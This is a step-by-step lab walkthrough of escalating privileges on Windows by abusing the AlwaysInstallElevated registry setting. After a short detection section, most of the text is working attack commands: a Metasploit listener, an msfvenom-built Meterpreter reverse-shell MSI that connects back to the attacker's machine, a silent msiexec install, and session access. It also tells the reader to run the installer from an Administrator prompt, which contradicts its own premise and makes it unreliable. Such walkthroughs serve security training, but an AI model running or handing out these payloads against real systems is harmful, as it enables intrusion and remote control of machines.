
### **What is AlwaysInstallElevated?**

When **AlwaysInstallElevated** is set to **1** in the registry, it allows non-admin users to install MSI files with admin privileges, meaning attackers can run a malicious MSI and get admin access.

### **Detection Phase (Checking if it's Enabled)**

1. **Open Command Prompt** on the Windows machine.
    
2. **Check if AlwaysInstallElevated is enabled**:
    
    - Type this command to check the **system-wide** setting:
        
        ```cmd
        reg query HKLM\Software\Policies\Microsoft\Windows\Installer
        ```
        
    - If **AlwaysInstallElevated** is set to `1`, that means MSI installations are elevated for all users.
        
    - Then, check the **user-specific** setting:
        
        ```cmd
        reg query HKCU\Software\Policies\Microsoft\Windows\Installer
        ```
        
    - If **AlwaysInstallElevated** is set to `1` here, then **the current user can also install MSI files with elevated privileges**.
        

---

### **Exploitation Phase (Using AlwaysInstallElevated to Escalate Privileges)**

Now that we know **AlwaysInstallElevated** is enabled, we can create and run a malicious MSI file that will give us admin access.

#### **On the Kali VM:**

1. **Start Metasploit**:
    
    Open a terminal on **Kali VM** and type:
    
    ```bash
    msfconsole
    ```
    
    This will start the Metasploit framework.
    
2. **Set up the listener** to catch the reverse shell:
    
    Type these commands in Metasploit:
    
    ```bash
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost [Kali_VM_IP]
    run
    ```
    
    - Replace `[Kali_VM_IP]` with your Kali VM's IP address.
        
    - This tells Metasploit to listen for a reverse shell connection from the target Windows machine.
        
3. **Generate the Malicious MSI**:
    
    Now we’ll generate an MSI file that contains a reverse shell payload:
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali_VM_IP] -f msi -o setup.msi
    ```
    
    This creates an MSI file (**setup.msi**) that, when run on the Windows machine, will open a reverse shell back to Kali.
    

---

#### **On the Windows VM:**

4. **Transfer the MSI file to the Windows VM**:
    
    - Use any method (e.g., HTTP server or file transfer) to copy the **setup.msi** file to **C:\Temp** on the Windows VM.
        
5. **Run the Malicious MSI**:
    
    - Open **Command Prompt** as Administrator on the Windows VM.
        
    - Run the following command to install the MSI file silently:
        
        ```cmd
        msiexec /quiet /qn /i C:\Temp\setup.msi
        ```
        
    - The MSI file will now run and trigger the reverse shell, connecting back to your Kali VM.
        

---

#### **Final Step: Access the Shell**

6. **Check the reverse shell**:
    
    - On Kali, Metasploit should now show a **Meterpreter session**.
        
    - To interact with it, use this command in Metasploit:
        
        ```bash
        sessions -i [Session_ID]
        ```
        
    - If everything worked, you’ll have an interactive shell on the Windows machine, and you can start running commands with elevated privileges!
        

---

